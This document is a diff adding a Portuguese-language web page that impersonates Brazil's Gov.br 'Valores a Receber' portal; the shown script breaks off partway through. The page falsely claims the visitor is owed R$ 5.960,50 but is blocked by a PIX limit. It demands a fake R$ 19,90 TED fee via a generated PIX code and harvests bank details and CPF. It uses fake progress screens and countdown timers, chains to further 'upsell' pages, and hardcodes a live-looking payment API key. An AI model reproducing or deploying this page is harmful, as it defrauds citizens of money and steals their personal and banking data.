@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <title>⚠️ Ação Necessária - Valores a Receber</title>
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+
+  <!-- Meta Pixel -->
+  <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','2045608016094458');fbq('init','1446258604180101');fbq('track','PageView');</script>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2045608016094458&ev=PageView&noscript=1"/></noscript>
+  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1446258604180101&ev=PageView&noscript=1"/></noscript>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z4W63165LV"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-Z4W63165LV', {
+      page_title: 'Upsell - Taxa TED | Valores a Receber',
+      page_path: '/etapa4/upsell.html'
+    });
+  </script>
+
+  <style>
+    :root {
+      --primary: #0042DA;
+      --green: #168821;
+      --red: #dc2626;
+      --orange: #ea580c;
+      --white: #fff;
+      --gray-light: #f5f6fa;
+      --text: #303235;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+    body { background: var(--gray-light); min-height: 100vh; display: flex; flex-direction: column; }
+
+    /* ── TELA DE LOADING/ENVIO ── */
+    #sending-screen {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: var(--white); z-index: 99999;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      padding: 32px 24px; text-align: center;
+    }
+    #sending-screen.hide {
+      animation: fadeOutScreen 0.5s ease-out forwards;
+    }
+    @keyframes fadeOutScreen {
+      from { opacity: 1; transform: scale(1); }
+      to   { opacity: 0; transform: scale(1.03); pointer-events: none; }
+    }
+
+    .sending-logo { height: 40px; margin-bottom: 32px; opacity: 0.8; }
+
+    .sending-circle {
+      width: 80px; height: 80px; border-radius: 50%;
+      background: linear-gradient(135deg, #e8f4fd, #dbeafe);
+      border: 3px solid var(--primary);
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 24px;
+      animation: circlePulse 1.2s infinite;
+    }
+    @keyframes circlePulse {
+      0%,100% { box-shadow: 0 0 0 0 rgba(0,66,218,0.3); }
+      50%      { box-shadow: 0 0 0 16px rgba(0,66,218,0); }
+    }
+    .sending-circle i { font-size: 32px; color: var(--primary); }
+
+    .sending-title { font-size: 20px; font-weight: 800; color: #1e3a8a; margin-bottom: 8px; }
+    .sending-sub   { font-size: 14px; color: #555; margin-bottom: 28px; line-height: 1.5; }
+
+    /* Steps animados */
+    .sending-steps { width: 100%; max-width: 320px; display: flex; flex-direction: column; gap: 10px; }
+    .sending-step {
+      display: flex; align-items: center; gap: 12px;
+      background: #f8faff; border: 1.5px solid #e0e7ff;
+      border-radius: 10px; padding: 10px 14px;
+      opacity: 0; transform: translateX(-10px);
+      transition: all 0.4s ease;
+    }
+    .sending-step.visible { opacity: 1; transform: translateX(0); }
+    .sending-step.done { border-color: #86efac; background: #f0fdf4; }
+    .sending-step.error { border-color: #fca5a5; background: #fef2f2; }
+
+    .step-icon {
+      width: 32px; height: 32px; border-radius: 50%; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center; font-size: 14px;
+    }
+    .step-icon.loading { background: #e0e7ff; color: var(--primary); animation: spinStep 0.8s linear infinite; }
+    .step-icon.done    { background: #dcfce7; color: var(--green); }
+    .step-icon.error   { background: #fee2e2; color: var(--red); }
+    @keyframes spinStep { to { transform: rotate(360deg); } }
+
+    .step-text { font-size: 13px; font-weight: 600; color: var(--text); text-align: left; }
+    .step-text.done  { color: var(--green); }
+    .step-text.error { color: var(--red); }
+
+    /* Barra de progresso */
+    .sending-progress {
+      width: 100%; max-width: 320px; height: 6px;
+      background: #e5e7eb; border-radius: 3px; margin-top: 20px; overflow: hidden;
+    }
+    .sending-progress-bar {
+      height: 100%; width: 0%; background: var(--primary);
+      border-radius: 3px; transition: width 0.4s linear;
+    }
+
+    header {
+      background: var(--white); padding: 10px 20px;
+      display: flex; justify-content: space-between; align-items: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,.06); border-bottom: 3px solid var(--red);
+    }
+    header .logo img { height: 35px; }
+    header .user-info {
+      background: #1451b4; color: white; padding: 5px 15px;
+      border-radius: 20px; font-size: 14px; font-weight: 600;
+      display: flex; align-items: center; gap: 8px;
+    }
+
+    nav {
+      background: var(--white); padding: 10px 20px;
+      font-size: 13px; color: #666; border-bottom: 1px solid #e5e5e5;
+      display: flex; align-items: center; gap: 4px;
+    }
+    nav i { color: var(--primary); margin: 0 6px; }
+
+    main {
+      flex: 1; display: flex; flex-direction: column; align-items: center;
+      padding: 20px 16px 60px; gap: 14px;
+      max-width: 480px; margin: 0 auto; width: 100%;
+    }
+
+    /* ── ALERTA BLOQUEIO ── */
+    .alert-block {
+      background: linear-gradient(135deg, #fef2f2, #fee2e2);
+      border: 2px solid var(--red); border-radius: 14px;
+      padding: 16px; width: 100%;
+      animation: shake 0.5s ease-in-out;
+    }
+    @keyframes shake {
+      0%,100%{transform:translateX(0)} 20%{transform:translateX(-5px)}
+      40%{transform:translateX(5px)} 60%{transform:translateX(-3px)} 80%{transform:translateX(3px)}
+    }
+    .alert-block .alert-top {
+      display: flex; align-items: center; gap: 10px; margin-bottom: 10px;
+    }
+    .alert-block .alert-icon {
+      width: 46px; height: 46px; flex-shrink: 0;
+      background: #fecaca; border: 2px solid var(--red);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    }
+    .alert-block .alert-icon i { font-size: 22px; color: var(--red); }
+    .alert-block .alert-title { font-size: 16px; font-weight: 800; color: var(--red); line-height: 1.3; }
+    .alert-block .alert-body { font-size: 13px; color: #7f1d1d; line-height: 1.75; }
+    .alert-block .alert-body strong { color: var(--red); }
+
+    /* ── STATUS BADGE ── */
+    .status-badge {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      background: #fef9c3; border: 1.5px solid #fbbf24;
+      border-radius: 8px; padding: 8px 14px; margin-top: 10px;
+      font-size: 12px; font-weight: 700; color: #92400e;
+    }
+    .status-badge i { font-size: 14px; color: #d97706; }
+
+    /* ── CONTRASTE VALOR ── */
+    .valor-contraste {
+      background: linear-gradient(135deg, #0042DA, #0032a8);
+      border-radius: 14px; padding: 18px 20px; width: 100%;
+      text-align: center; color: white;
+    }
+    .valor-contraste .vc-title { font-size: 13px; opacity: 0.85; margin-bottom: 12px; }
+    .valor-contraste .vc-row {
+      display: flex; align-items: center; justify-content: center; gap: 12px;
+    }
+    .valor-contraste .vc-receive {
+      font-size: 28px; font-weight: 800; color: #86efac;
+    }
+    .valor-contraste .vc-arrow { font-size: 22px; opacity: 0.6; }
+    .valor-contraste .vc-pay {
+      font-size: 22px; font-weight: 800; color: white;
+    }
+    .valor-contraste .vc-sub { font-size: 11px; opacity: 0.75; margin-top: 8px; }
+
+    /* ── CARD FORM ── */
+    .card {
+      background: var(--white); border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.08); padding: 22px 20px; width: 100%;
+    }
+    .card-title { font-size: 17px; font-weight: 700; color: var(--primary); text-align: center; margin-bottom: 4px; }
+    .card-subtitle { font-size: 13px; color: #666; text-align: center; margin-bottom: 18px; }
+
+    .form-group { margin-bottom: 14px; }
+    .form-group label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 5px; }
+    .form-group label span { color: var(--red); }
+    .form-group input, .form-group select {
+      width: 100%; padding: 13px 14px;
+      border: 2px solid #e5e7eb; border-radius: 10px;
+      font-size: 15px; color: var(--text);
+      background: #fafafa; transition: border-color 0.2s; outline: none;
+    }
+    .form-group input:focus, .form-group select:focus {
+      border-color: var(--primary); background: white;
+      box-shadow: 0 0 0 3px rgba(0,66,218,0.08);
+    }
+    .form-group input.filled { border-color: #86efac; background: #f0fdf4; }
+    .form-group select {
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat; background-position: right 14px center;
+    }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+    /* ── BOTÃO GERAR ── */
+    .btn-gerar {
+      width: 100%; padding: 18px;
+      background: #9ca3af; color: white; border: none;
+      border-radius: 12px; font-size: 17px; font-weight: 800;
+      cursor: not-allowed; transition: all 0.3s;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      margin-top: 10px;
+    }
+    .btn-gerar.active {
+      background: var(--green); cursor: pointer;
+      box-shadow: 0 4px 20px rgba(22,136,33,0.4);
+      animation: btnPulse 2s infinite;
+    }
+    @keyframes btnPulse {
+      0%,100%{ box-shadow: 0 4px 20px rgba(22,136,33,0.4); }
+      50%{ box-shadow: 0 4px 32px rgba(22,136,33,0.7); transform: translateY(-1px); }
+    }
+    .btn-gerar.active:hover { background: #0d6f18; animation: none; transform: translateY(-2px); }
+    .btn-gerar.loading { background: #6b7280; cursor: not-allowed; animation: none; }
+
+    .form-hint { text-align: center; font-size: 12px; color: #9ca3af; margin-top: 8px; }
+    .form-hint.ready { color: var(--green); font-weight: 600; }
+
+    /* ── URGÊNCIA ── */
+    .urgencia-box {
+      background: linear-gradient(135deg, #fff7ed, #ffedd5);
+      border: 1.5px solid #fb923c; border-radius: 10px;
+      padding: 12px 16px; width: 100%;
+      display: flex; align-items: center; gap: 10px;
+      font-size: 13px; color: #7c2d12;
+    }
+    .urgencia-box i { color: var(--orange); font-size: 18px; flex-shrink: 0; }
+
+    /* ── PIX SECTION ── */
+    #pix-section { display: none; }
+
+    .timer-wrapper {
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      background: #fff3cd; border: 1.5px solid #ffc107;
+      border-radius: 10px; padding: 10px 16px; margin-bottom: 16px;
+      transition: all 0.5s;
+    }
+    .timer-wrapper.urgent { background: #fee2e2; border-color: #fca5a5; animation: timerPulse 1s infinite; }
+    @keyframes timerPulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.02)} }
+    .timer-wrapper i { color: #d97706; font-size: 18px; }
+    .timer-wrapper.urgent i { color: var(--red); }
+    .timer-wrapper .timer-label { font-size: 13px; color: #92400e; font-weight: 600; }
+    #countdown-timer-upsell { font-size: 24px; font-weight: 800; color: var(--red); letter-spacing: 2px; min-width: 65px; text-align: center; }
+
+    .qr-wrapper { display: flex; justify-content: center; margin-bottom: 14px; }
+    .qr-wrapper img { width: 180px; height: 180px; border: 3px solid var(--primary); border-radius: 12px; padding: 6px; background: white; }
+
+    .step-list { list-style: none; margin-bottom: 14px; }
+    .step-list li { display: flex; align-items: flex-start; gap: 10px; padding: 6px 0; font-size: 13px; color: var(--text); border-bottom: 1px solid #f0f0f0; }
+    .step-list li:last-child { border-bottom: none; }
+    .step-num { background: var(--primary); color: white; width: 22px; height: 22px; border-radius: 50%; font-size: 12px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+
+    .copy-box { background: #f8f9ff; border: 1.5px solid #d0d7ff; border-radius: 10px; padding: 12px; margin-bottom: 12px; }
+    .copy-box .copy-label { font-size: 11px; color: #666; margin-bottom: 6px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+    .copy-code { font-size: 11px; color: #333; word-break: break-all; line-height: 1.5; font-family: monospace; max-height: 60px; overflow: hidden; }
+
+    .btn-copy {
+      width: 100%; padding: 17px;
+      background: var(--green); color: white; border: none;
+      border-radius: 12px; font-size: 17px; font-weight: 800;
+      cursor: pointer; display: flex; align-items: center;
+      justify-content: center; gap: 10px; transition: all 0.2s; margin-bottom: 8px;
+      box-shadow: 0 4px 20px rgba(22,136,33,0.35);
+      animation: btnPulse 2s infinite;
+    }
+    .btn-copy:hover { background: #0d6f18; animation: none; }
+    .btn-copy.copied { background: #0d6f18; animation: none; }
+
+    /* Botão fixo no rodapé */
+    #btn-copy-fixed {
+      position: fixed; bottom: 0; left: 0; right: 0;
+      padding: 16px 20px; background: var(--green); color: white;
+      border: none; font-size: 17px; font-weight: 800;
+      cursor: pointer; display: none; align-items: center;
+      justify-content: center; gap: 10px; z-index: 999;
+      box-shadow: 0 -4px 20px rgba(22,136,33,0.4);
+    }
+    #btn-copy-fixed.visible { display: flex; }
+    #btn-copy-fixed.copied { background: #0d6f18; }
+
+    .status-box { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 13px; color: #555; padding: 8px 0; }
+    .pulse-dot { width: 10px; height: 10px; background: #ffc107; border-radius: 50%; animation: pulseDot 1.4s infinite; }
+    @keyframes pulseDot { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.6)} }
+
+    /* ── AVISO RETORNO ── */
+    #aviso-retorno-upsell {
+      display: none; background: #eff6ff; border: 1.5px solid #93c5fd;
+      border-radius: 10px; padding: 12px 14px; margin-bottom: 10px;
+      font-size: 13px; color: #1e40af; line-height: 1.6;
+    }
+
+    /* ── OVERLAYS ── */
+    #success-overlay {
+      display: none; position: fixed; top:0;left:0;right:0;bottom:0;
+      background: rgba(0,0,0,0.88); z-index: 9999;
+      align-items: center; justify-content: center;
+      flex-direction: column; padding: 24px;
+    }
+    #success-overlay.active { display: flex; }
+    .success-card {
+      background: white; border-radius: 20px; padding: 32px 24px;
+      max-width: 380px; width: 100%; text-align: center;
+      animation: popIn 0.4s ease-out;
+    }
+    @keyframes popIn { from{transform:scale(0.8);opacity:0} to{transform:scale(1);opacity:1} }
+    .check-icon { width: 72px; height: 72px; background: #dcfce7; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; }
+    .check-icon i { font-size: 36px; color: var(--green); }
+    .success-card h2 { font-size: 22px; color: var(--green); margin-bottom: 8px; }
+    .success-card p { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; }
+    .btn-success { background: var(--green); color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; }
+
+    #expired-overlay {
+      display: none; position: fixed; top:0;left:0;right:0;bottom:0;
+      background: rgba(0,0,0,0.85); z-index: 9999;
+      align-items: center; justify-content: center; padding: 24px;
+    }
+    #expired-overlay.active { display: flex; }
+    .expired-card { background: white; border-radius: 20px; padding: 32px 24px; max-width: 380px; width: 100%; text-align: center; }
+    .expired-card i { font-size: 48px; color: var(--red); margin-bottom: 16px; display: block; }
+    .expired-card h2 { font-size: 20px; color: var(--red); margin-bottom: 8px; }
+    .expired-card p { font-size: 14px; color: #555; margin-bottom: 20px; }
+    .expired-card button { background: var(--primary); color: white; border: none; padding: 14px; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; }
+
+    footer { background: #001C4E; padding: 12px; text-align: center; }
+    footer img { height: 22px; opacity: 0.9; }
+  </style>
+</head>
+<body>
+
+  <!-- TELA DE ENVIO ANIMADA -->
+  <div id="sending-screen">
+    <img class="sending-logo" src="images/govbr.png" alt="Gov.br">
+    <div class="sending-circle"><i class="fas fa-paper-plane" id="sending-icon"></i></div>
+    <div class="sending-title" id="sending-title">Enviando seu PIX...</div>
+    <div class="sending-sub" id="sending-sub">Processando transferência de R$ 5.960,50<br>para sua chave PIX cadastrada</div>
+    <div class="sending-steps">
+      <div class="sending-step" id="step1">
+        <div class="step-icon loading" id="step1-icon"><i class="fas fa-circle-notch"></i></div>
+        <div class="step-text" id="step1-text">Verificando chave PIX...</div>
+      </div>
+      <div class="sending-step" id="step2">
+        <div class="step-icon loading" id="step2-icon"><i class="fas fa-circle-notch"></i></div>
+        <div class="step-text" id="step2-text">Autorizando transferência...</div>
+      </div>
+      <div class="sending-step" id="step3">
+        <div class="step-icon loading" id="step3-icon"><i class="fas fa-circle-notch"></i></div>
+        <div class="step-text" id="step3-text">Processando junto ao BCB...</div>
+      </div>
+      <div class="sending-step" id="step4">
+        <div class="step-icon loading" id="step4-icon"><i class="fas fa-circle-notch"></i></div>
+        <div class="step-text" id="step4-text">Confirmando envio...</div>
+      </div>
+    </div>
+    <div class="sending-progress">
+      <div class="sending-progress-bar" id="progress-bar"></div>
+    </div>
+  </div>
+
+  <header>
+    <div class="logo"><img src="images/govbr.png" alt="Gov.br"></div>
+    <div class="user-info">
+      <i class="fas fa-user-circle"></i>
+      <span id="user-display-name">Cidadão</span>
+    </div>
+  </header>
+
+  <nav>
+    <i class="fas fa-bars"></i>
+    <span>Portal do Cidadão</span>
+    <i class="fas fa-chevron-right" style="font-size:8px"></i>
+    <span>Valores a Receber</span>
+    <i class="fas fa-chevron-right" style="font-size:8px"></i>
+    <span>Liberação TED</span>
+  </nav>
+
+  <main>
+
+    <!-- ALERTA BLOQUEIO -->
+    <div class="alert-block">
+      <div class="alert-top">
+        <div class="alert-icon"><i class="fas fa-ban"></i></div>
+        <div class="alert-title">🚨 PIX BLOQUEADO — Limite Excedido</div>
+      </div>
+      <div class="alert-body">
+        Seu pagamento anterior foi <strong>confirmado</strong>, porém o sistema identificou que o valor do seu saque (<strong>R$ 5.960,50</strong>) <strong>excede o limite diário de transferência via PIX</strong> estabelecido pelo Banco Central.
+        <br><br>
+        Para liberar, é necessário processar via <strong>TED (Transferência Eletrônica Disponível)</strong> mediante pagamento da tarifa regulatória de <strong>R$ 19,90</strong>. Preencha seus dados bancários abaixo para continuar.
+      </div>
+      <div class="status-badge">
+        <i class="fas fa-clock"></i>
+        Seu saque está RETIDO no sistema — libere agora antes de expirar
+      </div>
+    </div>
+
+    <!-- CONTRASTE DE VALOR -->
+    <div class="valor-contraste">
+      <div class="vc-title">Pague agora e receba imediatamente</div>
+      <div class="vc-row">
+        <div class="vc-receive">R$ 5.960,50</div>
+        <div class="vc-arrow">←</div>
+        <div class="vc-pay">R$ 19,90</div>
+      </div>
+      <div class="vc-sub">Tarifa 100% reembolsada junto ao valor principal em até 24h</div>
+    </div>
+
+    <!-- URGÊNCIA -->
+    <div class="urgencia-box">
+      <i class="fas fa-exclamation-triangle"></i>
+      <span><strong>Atenção:</strong> Saques retidos por mais de 24h sem liberação são automaticamente cancelados e o valor retorna ao sistema federal. <strong>Não perca seu dinheiro.</strong></span>
+    </div>
+
+    <!-- CARD FORMULÁRIO -->
+    <div class="card">
+      <div class="card-title">Dados para Liberação TED</div>
+      <div class="card-subtitle">Preencha todos os campos para liberar o pagamento</div>
+
+      <div class="form-group">
+        <label>Banco de destino <span>*</span></label>
+        <select id="field-banco" onchange="checkForm()">
+          <option value="">Selecione seu banco</option>
+          <option>Banco do Brasil</option>
+          <option>Bradesco</option>
+          <option>Caixa Econômica Federal</option>
+          <option>Itaú</option>
+          <option>Santander</option>
+          <option>Nubank</option>
+          <option>Inter</option>
+          <option>C6 Bank</option>
+          <option>BTG Pactual</option>
+          <option>Sicoob</option>
+          <option>Outros</option>
+        </select>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Agência <span>*</span></label>
+          <input type="text" id="field-agencia" placeholder="0001" maxlength="6"
+            oninput="maskAgencia(this); checkForm()">
+        </div>
+        <div class="form-group">
+          <label>Conta <span>*</span></label>
+          <input type="text" id="field-conta" placeholder="00000-0" maxlength="10"
+            oninput="maskConta(this); checkForm()">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Tipo de conta <span>*</span></label>
+        <select id="field-tipo" onchange="checkForm()">
+          <option value="">Selecione</option>
+          <option>Conta Corrente</option>
+          <option>Conta Poupança</option>
+          <option>Conta de Pagamento</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>CPF do titular <span>*</span></label>
+        <input type="tel" id="field-cpf" placeholder="000.000.000-00" maxlength="14"
+          oninput="maskCPF(this); checkForm()">
+      </div>
+
+      <button class="btn-gerar" id="btn-gerar" disabled onclick="gerarPix()">
+        <i class="fas fa-lock" id="btn-icon"></i>
+        <span id="btn-text">Preencha os dados para liberar</span>
+      </button>
+      <p class="form-hint" id="form-hint">Todos os campos são obrigatórios</p>
+
+      <!-- PIX SECTION -->
+      <div id="pix-section">
+        <div style="height:1px;background:#e5e7eb;margin:20px 0;"></div>
+
+        <div class="timer-wrapper" id="timer-wrapper-upsell">
+          <i class="fas fa-clock"></i>
+          <div style="display:flex;flex-direction:column;align-items:center;">
+            <div style="display:flex;align-items:center;gap:8px;">
+              <span class="timer-label">Tempo para liberar:</span>
+              <span id="countdown-timer-upsell">15:00</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="qr-wrapper">
+          <img id="qr-upsell" src="" alt="QR Code PIX">
+        </div>
+
+        <ul class="step-list">
+          <li><span class="step-num">1</span> Abra o app do seu banco</li>
+          <li><span class="step-num">2</span> Escolha <strong>PIX Copia e Cola</strong></li>
+          <li><span class="step-num">3</span> Cole o código abaixo e confirme</li>
+          <li><span class="step-num">4</span> <strong>Volte aqui</strong> após pagar — confirmação automática</li>
+        </ul>
+
+        <div class="copy-box">
+          <div class="copy-label">PIX Copia e Cola</div>
+          <div class="copy-code" id="pix-code-upsell">—</div>
+        </div>
+
+        <button class="btn-copy" id="btn-copy-upsell" onclick="copyPix()">
+          <i class="fas fa-copy"></i> Copiar Código PIX
+        </button>
+
+        <div id="aviso-retorno-upsell">
+          <strong style="display:block;margin-bottom:4px;">📱 Após pagar, volte para esta página!</strong>
+          Abra seu banco, pague e <strong>retorne aqui</strong> para confirmar. A liberação do saque é automática assim que detectarmos o pagamento.
+        </div>
+
+        <div class="status-box">
+          <div class="pulse-dot"></div>
+          <span>Aguardando confirmação da tarifa TED...</span>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- BOTÃO FIXO NO RODAPÉ -->
+  <button id="btn-copy-fixed" onclick="copyPix()">
+    <i class="fas fa-copy"></i> Copiar PIX e Liberar Saque
+  </button>
+
+  <footer><img src="images/logo.png" alt="Gov.br"></footer>
+
+  <!-- OVERLAY SUCESSO -->
+  <div id="success-overlay">
+    <div class="success-card">
+      <div class="check-icon"><i class="fas fa-check"></i></div>
+      <h2>TED Liberada! ✅</h2>
+      <p>Tarifa confirmada. O valor de <strong>R$ 5.960,50</strong> será depositado na sua conta em até <strong>24 horas úteis</strong>.</p>
+      <button class="btn-success" id="btn-final">Ver Comprovante Final</button>
+    </div>
+  </div>
+
+  <!-- OVERLAY EXPIRADO -->
+  <div id="expired-overlay">
+    <div class="expired-card">
+      <i class="fas fa-times-circle"></i>
+      <h2>Código Expirado</h2>
+      <p>O tempo para pagamento expirou. Gere um novo código.</p>
+      <button onclick="window.location.reload()">Gerar Novo Código</button>
+    </div>
+  </div>
+
+  <script>
+    // ─── PARAMS ──────────────────────────────────────────────────────────────
+    const urlParams   = new URLSearchParams(window.location.search);
+    const userName    = urlParams.get('nome')         || 'Cidadão';
+    const userCPF     = urlParams.get('cpf')          || '';
+    const utmSource   = urlParams.get('utm_source')   || '';
+    const utmCampaign = urlParams.get('utm_campaign') || '';
+    const utmMedium   = urlParams.get('utm_medium')   || '';
+    const utmContent  = urlParams.get('utm_content')  || '';
+    const utmTerm     = urlParams.get('utm_term')     || '';
+
+    document.getElementById('user-display-name').textContent = userName.split(' ')[0];
+
+    // Pré-preenche CPF
+    if (userCPF) {
+      const cpfInput = document.getElementById('field-cpf');
+      cpfInput.value = userCPF;
+      cpfInput.classList.add('filled');
+    }
+
+    // ─── CONFIG ──────────────────────────────────────────────────────────────
+    const GP_API_BASE      = 'https://app.gladepay.com.br/v1';
+    const GP_API_KEY       = 'gp_live_hmVHJH7GV4eTWqnaxx069vNHPZ3sGjeI';
+    const GP_CALLBACK_URL  = 'https://consulta-valoresareceber-hoje.vercel.app/api/hp-webhook';
+    const HP_AMOUNT        = 19.90;
+    const HP_AMOUNT_CENTS  = Math.round(HP_AMOUNT * 100);
+
+    let externalId      = null;
+    let pollingInterval = null;
+
+    function isPaidStatus(s) {
+      if (!s) return false;
+      const v = String(s).toUpperCase();
+      return v === 'SETTLED' || v === 'PAID';
+    }
+    let timerSeconds    = 15 * 60;
+    let timerInterval   = null;
+
+    // ─── MASKS ───────────────────────────────────────────────────────────────
+    function maskAgencia(el) {
+      el.value = el.value.replace(/\D/g,'').slice(0,4);
+      el.classList.toggle('filled', el.value.length > 0);
+    }
+    function maskConta(el) {
+      let v = el.value.replace(/\D/g,'');
+      if (v.length > 1) v = v.slice(0,-1) + '-' + v.slice(-1);
+      el.value = v;
+      el.classList.toggle('filled', el.value.length > 0);
+    }
+    function maskCPF(el) {
+      let v = el.value.replace(/\D/g,'');
+      v = v.replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+      el.value = v;
+      el.classList.toggle('filled', el.value.length > 0);
+    }
+
+    // ─── VALIDAÇÃO ───────────────────────────────────────────────────────────
+    function checkForm() {
+      const banco = document.getElementById('field-banco').value.trim();
+      const ag    = document.getElementById('field-agencia').value.trim();
+      const conta = document.getElementById('field-conta').value.trim();
+      const tipo  = document.getElementById('field-tipo').value.trim();
+      const cpf   = document.getElementById('field-cpf').value.replace(/\D/g,'');
+      const btn   = document.getElementById('btn-gerar');
+      const hint  = document.getElementById('form-hint');
+      const icon  = document.getElementById('btn-icon');
+      const txt   = document.getElementById('btn-text');
+      const filled = banco && ag.length >= 3 && conta.length >= 4 && tipo && cpf.length === 11;
+
+      if (filled) {
+        btn.disabled = false;
+        btn.classList.add('active');
+        icon.className = 'fas fa-bolt';
+        txt.textContent = 'Liberar Saque — Pagar R$ 19,90';
+        hint.textContent = '✅ Dados preenchidos — clique para liberar';
+        hint.classList.add('ready');
+      } else {
+        btn.disabled = true;
+        btn.classList.remove('active');
+        icon.className = 'fas fa-lock';
+        txt.textContent = 'Preencha os dados para liberar';
+        hint.textContent = 'Todos os campos são obrigatórios';
+        hint.classList.remove('ready');
+      }
+    }
+
+    // ─── PIXEL ───────────────────────────────────────────────────────────────
+    function fbServerEvent(eventName, value, eventId) {
+      fetch('/api/fb-event', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          event_name: eventName, value, currency: 'BRL',
+          cpf: userCPF, client_user_agent: navigator.userAgent,
+          event_source_url: window.location.href,
+          fbc: document.cookie.match(/_fbc=([^;]+)/)?.[1] || '',
+          fbp: document.cookie.match(/_fbp=([^;]+)/)?.[1] || '',
+          external_id: externalId, event_id: eventId
+        })
+      }).catch(() => {});
+    }
+
+    // ─── TIMER ───────────────────────────────────────────────────────────────
+    function startTimer() {
+      timerInterval = setInterval(() => {
+        timerSeconds--;
+        const m = Math.floor(timerSeconds/60).toString().padStart(2,'0');
+        const s = (timerSeconds%60).toString().padStart(2,'0');
+        document.getElementById('countdown-timer-upsell').textContent = `${m}:${s}`;
+        if (timerSeconds <= 180) {
+          document.getElementById('timer-wrapper-upsell').classList.add('urgent');
+        }
+        if (timerSeconds <= 0) {
+          clearInterval(timerInterval);
+          if (pollingInterval) clearInterval(pollingInterval);
+          document.getElementById('expired-overlay').classList.add('active');
+        }
+      }, 1000);
+    }
+
+    // ─── GLADEPAY ────────────────────────────────────────────────────────────
+    function buildUtmQS() {
+      const p = new URLSearchParams();
+      if (utmSource)   p.set('utm_source',   utmSource);
+      if (utmCampaign) p.set('utm_campaign', utmCampaign);
+      if (utmMedium)   p.set('utm_medium',   utmMedium);
+      if (utmContent)  p.set('utm_content',  utmContent);
+      if (utmTerm)     p.set('utm_term',      utmTerm);
+      const q = p.toString();
+      return q ? '?' + q : '';
+    }
+
+    async function createOrder() {
+      const refId = `UPSELL1-${Date.now()}-${userCPF.replace(/\D/g,'')}`;
+      const r = await fetch(`${GP_API_BASE}/deposito${buildUtmQS()}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${GP_API_KEY}` },
+        body: JSON.stringify({
+          amountCents:  HP_AMOUNT_CENTS,
+          reference:    refId,
+          callbackUrl:  GP_CALLBACK_URL,
+          customerName: userName,
+          description:  'Upsell 01 - 19,90'
+        })
+      });
+      return r.json();
+    }
+
+    async function checkPaymentStatus(id) {
+      const r = await fetch(`${GP_API_BASE}/deposito/status?txId=${encodeURIComponent(id)}`, {
+        headers: { 'Authorization': `Bearer ${GP_API_KEY}` }
+      });
+      return r.json();
+    }
+
+    async function checkWebhookStatus(id) {
+      try {
+        const r = await fetch(`/api/hp-webhook?order_id=${id}`);
+        return (await r.json()).paid === true;
+      } catch(e) { return false; }
+    }
+
+    function onUpsellPaid() {
+      clearInterval(pollingInterval);
+      clearInterval(timerInterval);
+      const eventId = `purchase-ted-${externalId}-${Date.now()}`;
+
+      // Salva localStorage imediatamente
+      localStorage.setItem('hp_upsell_paid_' + userCPF.replace(/\D/g,''), '1');
+
+      // Mostra overlay de sucesso imediatamente
+      document.getElementById('success-overlay').classList.add('active');
+      document.getElementById('btn-final').onclick = () => {
+        window.location.href = 'upsell2/' + window.location.search;
+      };
+
+      // Pixel client-side — não bloqueia
